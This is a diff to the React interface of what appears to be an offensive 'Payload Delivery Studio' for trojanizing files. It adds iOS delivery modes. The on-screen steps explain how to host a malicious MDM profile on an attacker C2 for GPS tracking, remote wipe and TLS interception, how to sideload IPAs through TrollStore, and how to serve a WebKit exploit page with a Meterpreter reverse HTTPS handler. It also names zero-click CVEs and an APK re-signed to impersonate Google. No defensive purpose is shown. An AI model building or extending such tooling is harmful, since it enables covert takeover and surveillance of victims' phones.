@@ -116,7 +116,7 @@ export default function EmbedPage() {
         {/* Header */}
         <div className="mb-6">
           <h1 className="text-[13px] tracking-[0.3em] text-green-400">PAYLOAD DELIVERY STUDIO</h1>
-          <p className="text-[8px] text-green-900/50 mt-1">EMBED · TROJAN · DELIVER — PDF / VIDEO / OFFICE / LNK / HTA / APK</p>
+          <p className="text-[8px] text-green-900/50 mt-1">EMBED · TROJAN · DELIVER — PDF / VIDEO / OFFICE / APK / iOS MDM / IPA / WEBKIT</p>
         </div>
 
         <div className="grid grid-cols-[1fr_380px] gap-5">
@@ -188,6 +188,14 @@ export default function EmbedPage() {
                     className="w-full bg-black/30 border border-green-900/30 rounded px-2 py-1.5 text-[9px] text-green-400 focus:outline-none focus:border-green-700" />
                 </div>
               )}
+              {(format === "ios_mdm" || format === "ios_ipa" || format === "ios_webkit") && (
+                <div className="col-span-2 text-[8px] text-cyan-800/60 border border-cyan-900/20 rounded p-2">
+                  iOS {format === "ios_mdm" ? "MDM" : format === "ios_ipa" ? "IPA" : "WebKit"} — works iOS 14→18.
+                  {format === "ios_mdm" && " Host .mobileconfig at /enroll with MIME application/x-apple-aspen-config."}
+                  {format === "ios_ipa" && " Host manifest.plist + app.ipa on HTTPS. TrollStore iOS 14–17.0b4."}
+                  {format === "ios_webkit" && " Host exploit.html on HTTPS. Handler: apple_ios/aarch64/meterpreter_reverse_https."}
+                </div>
+              )}
             </div>
 
             {/* How it works for selected format */}
@@ -251,6 +259,30 @@ export default function EmbedPage() {
                   <div>④ Payload smali classes copied into template app</div>
                   <div>⑤ MainActivity.smali patched to call payload on launch</div>
                   <div>⑥ Repackaged, signed with CN=Google Inc, victim installs normally</div>
+                </div>
+              )}
+              {format === "ios_mdm" && (
+                <div className="space-y-1 text-[8px] text-green-900/50">
+                  <div>① Full .mobileconfig generated (MDM + VPN + CA cert + email)</div>
+                  <div>② Host at https://YOUR_C2/enroll — all iOS 14→18, no jailbreak</div>
+                  <div>③ Victim opens URL → Settings → Install (2 taps)</div>
+                  <div>④ MDM channel: GPS, remote wipe, silent app install, TLS MITM via CA</div>
+                </div>
+              )}
+              {format === "ios_ipa" && (
+                <div className="space-y-1 text-[8px] text-green-900/50">
+                  <div>① manifest.plist generated for OTA install</div>
+                  <div>② TrollStore (iOS 14–17.0b4): permanent IPA, no Apple account</div>
+                  <div>③ Enterprise: itms-services:// link → Install prompt</div>
+                  <div>④ Host manifest + app.ipa on HTTPS server</div>
+                </div>
+              )}
+              {format === "ios_webkit" && (
+                <div className="space-y-1 text-[8px] text-green-900/50">
+                  <div>① exploit.html generated with WebKit stager</div>
+                  <div>② Victim opens URL in Safari → code execution</div>
+                  <div>③ Zero-click variants: CVE-2021-30860, CVE-2023-41064 (iMessage)</div>
+                  <div>④ MSF handler: apple_ios/aarch64/meterpreter_reverse_https</div>
                 </div>
               )}
             </div>
